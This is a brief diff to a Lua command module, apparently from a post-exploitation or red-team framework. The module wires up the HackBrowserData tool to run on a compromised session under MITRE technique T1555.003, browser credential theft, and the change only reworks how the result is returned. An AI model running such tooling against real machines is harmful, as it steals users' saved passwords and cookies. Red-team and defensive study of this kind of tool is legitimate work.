@@ -17,12 +17,10 @@ local function HackBrowserData(args)
     local hack_browser_data_file = script_resource(
                                        "common/recon/HackBrowserData." ..
                                            session.Os.Arch .. ".exe")
-
-    local result = execute_exe(session, hack_browser_data_file, args, true, 600,
-                               arch, "", new_sac())
-    print(result)
-    -- sharpblock_exe(hack_browser_data_file, args)
-    print("HackBrowserData end")
+    --local lib = require("community-lib")
+    --lib.sharpblock(hack_browser_data_file, args)
+    return execute_exe(session, hack_browser_data_file, args, true, 600,
+            arch, "", new_sac())
 end
 command("common:HackBrowserData", HackBrowserData, "HackBrowserData",
         "T1555.003")
